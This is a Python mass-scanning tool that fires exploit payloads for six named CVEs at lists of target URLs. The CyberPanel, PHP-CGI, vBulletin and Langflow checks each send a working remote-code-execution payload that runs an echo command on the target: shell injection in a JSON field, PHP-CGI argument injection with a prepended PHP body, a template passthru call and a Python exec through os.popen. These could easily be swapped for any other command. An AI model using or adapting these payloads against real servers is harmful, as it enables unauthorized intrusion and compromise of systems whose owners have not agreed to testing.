#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
- CVE-2024-51378 (CyberPanel RCE)
- CVE-2024-4577 (PHP CGI RCE)
- CVE-2025-48827 (vBulletin RCE)
- CVE-2025-3248 (Langflow RCE)
- CVE-2025-34028 (Commvault RCE)
- CVE-2025-47577 (Wishlist File Upload)

"""

import argparse
import requests
import httpx
import re
import sys
import urllib3
import threading
import time
import random
import string
import base64
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin
from colorama import init, Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT

class MassScanner:
    def __init__(self):
        self.timeout = 15
        self.threads = 5
        self.results = []
        self.lock = threading.Lock()
        self.scanned = 0
        self.total_targets = 0
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*'
        })

    def print_banner(self):
        print(f"""{BOLD}{BLUE}

⠤⠤⠤⠤⠤⠤⢤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠤⠶⠶⠶⠦⠤⠤⠤⠤⠤⢤⣤⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠄⢂⣠⣭⣭⣕⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠀⠀⠀⠤⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉
⠀⠀⢀⠜⣳⣾⡿⠛⣿⣿⣿⣦⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣍⣀⣦⠦⠄⣀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⣄⣽⣿⠋⠀⡰⢿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡿⠛⠛⡿⠿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣁⣂⣤⡄⠀⠀⠀⠀⠀⠀
⢳⣶⣼⣿⠃⠀⢀⠧⠤⢜⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠀⡇⠀⣀⡈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠁⠐⠀⣀⠀⠀
⠀⠙⠻⣿⠀⠀⠀⠀⠀⠀⢹⣿⣿⡝⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡿⠋⠀⠀⠀⠀⠠⠃⠁⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⡿⠋⠀⠀
⠀⠀⠀⠙⡄⠀⠀⠀⠀⠀⢸⣿⣿⡃⢼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡏⠉⠉⠻⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⢰⠀⠀⠰⡒⠊⠻⠿⠋⠐⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣇⡀⠀⠑⢄⠀⠀⠀⡠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢖⠠⠤⠤⠔⠙⠻⠿⠋⠱⡑⢄⠀⢠⠟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠉⠒⠒⠻⠶⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠡⢀⡵⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠦⣀⠀⠀⠀⠀⠀⢀⣤⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠙⠛⠓⠒⠲⠿⢍⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{MAGENTA}Unified Mass Vulnerability Scanner{RESET}
{CYAN}Combines multiple CVE exploits into a single scanning tool{RESET}
{YELLOW}Author: Security Researcher{RESET}
""")

    def print_help(self):
        print(f"""
{BOLD}Usage:{RESET}
  python3 mass_scanner.py -f targets.txt [options]
  python3 mass_scanner.py -u http://target.com [options]

{BOLD}Options:{RESET}
  -u, --url         Single target URL
  -f, --file        File containing list of targets
  -t, --threads     Number of threads (default: 5)
  --timeout         Request timeout in seconds (default: 15)
  --all             Scan for all vulnerabilities (default)
  --cyberpanel      Scan only for CyberPanel (CVE-2024-51378)
  --phpcgi          Scan only for PHP CGI (CVE-2024-4577)
  --vbulletin       Scan only for vBulletin (CVE-2025-48827)
  --langflow        Scan only for Langflow (CVE-2025-3248)
  --commvault       Scan only for Commvault (CVE-2025-34028)
  --wishlist        Scan only for Wishlist Upload (CVE-2025-47577)
  -o, --output      Output file for results
  -v, --verbose     Verbose output

{BOLD}Examples:{RESET}
  python3 mass_scanner.py -f targets.txt -t 10 --all -o results.txt
  python3 mass_scanner.py -u http://example.com --phpcgi --vbulletin
""")

    def print_result(self, target, cve, status, details=""):
        with self.lock:
            if status == "VULNERABLE":
                color = GREEN
            elif status == "NOT VULNERABLE":
                color = YELLOW
            else:
                color = RED

            result = {
                "target": target,
                "cve": cve,
                "status": status,
                "details": details
            }
            self.results.append(result)

            print(f"[{CYAN}{target}{RESET}] {BOLD}{cve}{RESET}: {color}{status}{RESET}")
            if details:
                print(f"   {YELLOW}Details:{RESET} {details}")

    def check_cyberpanel(self, target):
        """Check for CyberPanel RCE (CVE-2024-51378)"""
        try:
            allowed_endpoints = ["/ftp/getresetstatus", "/dns/getresetstatus"]
            client = httpx.Client(base_url=target, verify=False, timeout=self.timeout)

            try:
                response = client.get("/")
                if "cyberpanel" not in response.text.lower():
                    self.print_result(target, "CVE-2024-51378", "NOT APPLICABLE", "Not a CyberPanel")
                    return
            except:
                self.print_result(target, "CVE-2024-51378", "ERROR", "Connection failed")
                return

            for endpoint in allowed_endpoints:
                try:
                    csrf_token = client.get("/").cookies.get("csrftoken")
                    if not csrf_token:
                        continue

                    headers = {
                        "X-CSRFToken": csrf_token,
                        "Content-Type": "application/json",
                        "Referer": target
                    }
                    payload = '{"statusfile": "; echo CVE-2024-51378-TEST; #"}'
                    response = client.request("OPTIONS", endpoint, headers=headers, data=payload)
                    
                    if "CVE-2024-51378-TEST" in str(response.content):
                        self.print_result(target, "CVE-2024-51378", "VULNERABLE", f"Endpoint: {endpoint}")
                        return
                except:
                    continue

            self.print_result(target, "CVE-2024-51378", "NOT VULNERABLE")
        except Exception as e:
            self.print_result(target, "CVE-2024-51378", "ERROR", str(e))

    def check_phpcgi(self, target):
        """Check for PHP CGI RCE (CVE-2024-4577)"""
        try:
            cgi_paths = [
                "/php-cgi/php-cgi.exe",
                "/php/php-cgi.exe",
                "/cgi-bin/php-cgi.exe",
                "/php-cgi.exe",
                "/php.exe",
                "/php/php.exe"
            ]
            
            soft_hyphen = "%AD"
            
            php_settings = [
                "-d cgi.force_redirect=0",
                "-d cgi.redirect_status_env=0",
                "-d fastcgi.impersonate=1",
                "-d open_basedir=",
                "-d disable_functions=",
                "-d auto_prepend_file=php://input",
                "-d allow_url_include=1",
                "-d allow_url_fopen=1"
            ]
            
            for path in cgi_paths:
                try:
                    settings_str = " ".join(php_settings).replace("-", soft_hyphen)
                    settings_str = settings_str.replace("=", "%3D").replace(" ", "+")
                    payload_url = f"{path}?{settings_str}"
                    full_url = urljoin(target, payload_url)
                    
                    php_code = """<?php
error_reporting(0);
echo '[START]';
echo 'CVE-2024-4577-TEST';
echo '[END]';
die();
?>"""
                    
                    response = requests.post(
                        full_url,
                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
                        data=php_code,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=False
                    )
                    
                    if response.status_code == 200:
                        output_match = re.search(r'\[START\](.*?)\[END\]', response.text, re.DOTALL)
                        if output_match and "CVE-2024-4577-TEST" in output_match.group(1):
                            self.print_result(target, "CVE-2024-4577", "VULNERABLE", f"CGI Path: {path}")
                            return
                except:
                    continue
            
            self.print_result(target, "CVE-2024-4577", "NOT VULNERABLE")
        except Exception as e:
            self.print_result(target, "CVE-2024-4577", "ERROR", str(e))

    def check_vbulletin(self, target):
        """Check for vBulletin RCE (CVE-2025-48827)"""
        try:
            common_paths = ['/', '/forum/', '/vb/', '/community/', '/forums/']
            
            found_path = None
            for path in common_paths:
                try:
                    full_url = urljoin(target, path)
                    response = requests.get(full_url, timeout=self.timeout, verify=False)
                    if "vBulletin" in response.text or "vbulletin" in response.text:
                        found_path = full_url
                        break
                except:
                    continue
            
            if not found_path:
                self.print_result(target, "CVE-2025-48827", "NOT APPLICABLE", "Not a vBulletin")
                return
            
            try:
                session = requests.Session()
                session.verify = False
                
                inject_data = {
                    "routestring": "ajax/api/ad/replaceAdTemplate",
                    "styleid": "1",
                    "location": "rce",
                    "template": '<vb:if condition=\'passthru("echo CVE-2025-48827-TEST")\'> </vb:if>'
                }
                
                response = session.post(found_path, data=inject_data, timeout=self.timeout)
                
                if "CVE-2025-48827-TEST" in response.text:
                    self.print_result(target, "CVE-2025-48827", "VULNERABLE", f"Path: {found_path}")
                else:
                    self.print_result(target, "CVE-2025-48827", "NOT VULNERABLE", f"vBulletin found at {found_path}")
            except Exception as e:
                self.print_result(target, "CVE-2025-48827", "ERROR", str(e))
        except Exception as e:
            self.print_result(target, "CVE-2025-48827", "ERROR", str(e))

    def check_langflow(self, target):
        """Check for Langflow RCE (CVE-2025-3248)"""
        try:
            endpoint = urljoin(target, '/api/v1/validate/code')
            
            try:
                response = requests.get(urljoin(target, '/'), timeout=self.timeout, verify=False)
                if "langflow" not in response.text.lower():
                    self.print_result(target, "CVE-2025-3248", "NOT APPLICABLE", "Not a Langflow")
                    return
            except:
                self.print_result(target, "CVE-2025-3248", "ERROR", "Connection failed")
                return
            
            payload = {
                "code": """
def run(cd=exec('raise Exception(__import__("os").popen("echo CVE-2025-3248-TEST").read())')): pass
"""
            }
            
            try:
                response = requests.post(
                    endpoint,
                    json=payload,
                    timeout=self.timeout,
                    verify=False,
                    headers={'Content-Type': 'application/json'}
                )
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        error_msg = data.get("function", {}).get("errors", [""])[0]
                        if "CVE-2025-3248-TEST" in error_msg:
                            self.print_result(target, "CVE-2025-3248", "VULNERABLE", f"Endpoint: {endpoint}")
                            return
                    except:
                        pass
                
                self.print_result(target, "CVE-2025-3248", "NOT VULNERABLE")
            except Exception as e:
                self.print_result(target, "CVE-2025-3248", "ERROR", str(e))
        except Exception as e:
            self.print_result(target, "CVE-2025-3248", "ERROR", str(e))

    def check_commvault(self, target):
        """Check for Commvault RCE (CVE-2025-34028)"""
        try:
            try:
                response = requests.get(
                    f"{target}/commandcenter/deployServiceCommcell.do", 
                    verify=False, 
                    timeout=self.timeout
                )
                if "></cv:cvMessages>" not in response.text:
                    self.print_result(target, "CVE-2025-34028", "NOT APPLICABLE", "Not Commvault")
                    return
            except requests.RequestException:
                self.print_result(target, "CVE-2025-34028", "ERROR", "Connection failed")
                return
            
            self.print_result(target, "CVE-2025-34028", "POTENTIALLY VULNERABLE", "Commvault detected - manual verification required")
        except Exception as e:
            self.print_result(target, "CVE-2025-34028", "ERROR", str(e))

    def check_wishlist(self, target):
        """Check for Wishlist File Upload (CVE-2025-47577)"""
        try:
            try:
                response = requests.get(target, timeout=self.timeout, verify=False)
                if "wp-content" not in response.text and "wordpress" not in response.text.lower():
                    self.print_result(target, "CVE-2025-47577", "NOT APPLICABLE", "Not a WordPress site")
                    return
            except:
                self.print_result(target, "CVE-2025-47577", "ERROR", "Connection failed")
                return
            
            try:
                product_match = re.search(r'data-tinv-wl-product="(\d+)"', response.text)
                if not product_match:
                    self.print_result(target, "CVE-2025-47577", "NOT VULNERABLE", "No wishlist functionality detected")
                    return
                
                self.print_result(target, "CVE-2025-47577", "POTENTIALLY VULNERABLE", "Wishlist functionality detected - manual verification required")
            except Exception as e:
                self.print_result(target, "CVE-2025-47577", "ERROR", str(e))
        except Exception as e:
            self.print_result(target, "CVE-2025-47577", "ERROR", str(e))

    def scan_target(self, target, options):
        """Scan a single target for all selected vulnerabilities"""
        try:
            if not target.startswith(('http://', 'https://')):
                target = f"http://{target}"
            
            target = target.rstrip('/')
            
            print(f"[{CYAN}*{RESET}] Scanning {BOLD}{target}{RESET}")
            
            if options['all'] or options['cyberpanel']:
                self.check_cyberpanel(target)
            
            if options['all'] or options['phpcgi']:
                self.check_phpcgi(target)
            
            if options['all'] or options['vbulletin']:
                self.check_vbulletin(target)
            
            if options['all'] or options['langflow']:
                self.check_langflow(target)
            
            if options['all'] or options['commvault']:
                self.check_commvault(target)
            
            if options['all'] or options['wishlist']:
                self.check_wishlist(target)
            
        except Exception as e:
            print(f"[{RED}!{RESET}] Error scanning {target}: {str(e)}")
        finally:
            with self.lock:
                self.scanned += 1

    def print_progress(self):
        """Print progress of scanning"""
        while True:
            with self.lock:
                sys.stdout.write(f"\r[{CYAN}*{RESET}] Scanned {self.scanned}/{self.total_targets} targets")
                sys.stdout.flush()
                if self.scanned >= self.total_targets:
                    break
            time.sleep(0.5)

    def save_results(self, filename):
        """Save results to a file"""
        try:
            with open(filename, 'w') as f:
                for result in self.results:
                    f.write(f"Target: {result['target']}\n")
                    f.write(f"CVE: {result['cve']}\n")
                    f.write(f"Status: {result['status']}\n")
                    if result['details']:
                        f.write(f"Details: {result['details']}\n")
                    f.write("\n")
            print(f"\n[{GREEN}+{RESET}] Results saved to {filename}")
        except Exception as e:
            print(f"\n[{RED}!{RESET}] Error saving results: {str(e)}")

    def run(self):
        """Main execution function"""
        self.print_banner()
        
        parser = argparse.ArgumentParser(description="Unified Mass Vulnerability Scanner", add_help=False)
        parser.add_argument('-h', '--help', action='store_true', help='Show help message')
        parser.add_argument('-u', '--url', help='Single target URL')
        parser.add_argument('-f', '--file', help='File containing list of targets')
        parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
        parser.add_argument('--timeout', type=int, default=15, help='Request timeout in seconds (default: 15)')
        parser.add_argument('--all', action='store_true', help='Scan for all vulnerabilities (default)')
        parser.add_argument('--cyberpanel', action='store_true', help='Scan only for CyberPanel (CVE-2024-51378)')
        parser.add_argument('--phpcgi', action='store_true', help='Scan only for PHP CGI (CVE-2024-4577)')
        parser.add_argument('--vbulletin', action='store_true', help='Scan only for vBulletin (CVE-2025-48827)')
        parser.add_argument('--langflow', action='store_true', help='Scan only for Langflow (CVE-2025-3248)')
        parser.add_argument('--commvault', action='store_true', help='Scan only for Commvault (CVE-2025-34028)')
        parser.add_argument('--wishlist', action='store_true', help='Scan only for Wishlist Upload (CVE-2025-47577)')
        parser.add_argument('-o', '--output', help='Output file for results')
        parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
        
        args = parser.parse_args()
        
        if args.help:
            self.print_help()
            sys.exit(0)
        
        if not args.url and not args.file:
            self.print_help()
            print(f"\n[{RED}!{RESET}] Error: You must specify either -u/--url or -f/--file")
            sys.exit(1)
        
        if not (args.cyberpanel or args.phpcgi or args.vbulletin or args.langflow or 
                args.commvault or args.wishlist):
            args.all = True
        
        options = {
            'all': args.all,
            'cyberpanel': args.cyberpanel,
            'phpcgi': args.phpcgi,
            'vbulletin': args.vbulletin,
            'langflow': args.langflow,
            'commvault': args.commvault,
            'wishlist': args.wishlist
        }
        
        targets = []
        if args.url:
            targets.append(args.url)
        elif args.file:
            try:
                with open(args.file, 'r') as f:
                    targets = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"\n[{RED}!{RESET}] Error: File {args.file} not found")
                sys.exit(1)
            except Exception as e:
                print(f"\n[{RED}!{RESET}] Error reading file: {str(e)}")
                sys.exit(1)
        
        if not targets:
            print(f"\n[{RED}!{RESET}] Error: No valid targets provided")
            sys.exit(1)
        
        self.threads = args.threads
        self.timeout = args.timeout
        self.total_targets = len(targets)
        
        print(f"[{CYAN}*{RESET}] Starting scan with {self.threads} threads")
        print(f"[{CYAN}*{RESET}] Scanning {self.total_targets} targets")
        
        progress_thread = threading.Thread(target=self.print_progress)
        progress_thread.start()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for target in targets:
                executor.submit(self.scan_target, target, options)
        
        progress_thread.join()
        
        print("\n\n" + "="*50)
        print(f"{BOLD}{GREEN}SCAN SUMMARY{RESET}")
        print("="*50)
        
        vuln_counts = {}
        for result in self.results:
            if result['status'] == "VULNERABLE":
                if result['cve'] not in vuln_counts:
                    vuln_counts[result['cve']] = 0
                vuln_counts[result['cve']] += 1
        
        for cve, count in vuln_counts.items():
            print(f"{GREEN}[+]{RESET} {count} targets vulnerable to {BOLD}{cve}{RESET}")
        
        if args.output:
            self.save_results(args.output)
        
        print(f"\n[{GREEN}+{RESET}] Scan completed!")

if __name__ == "__main__":
    scanner = MassScanner()
    scanner.run()
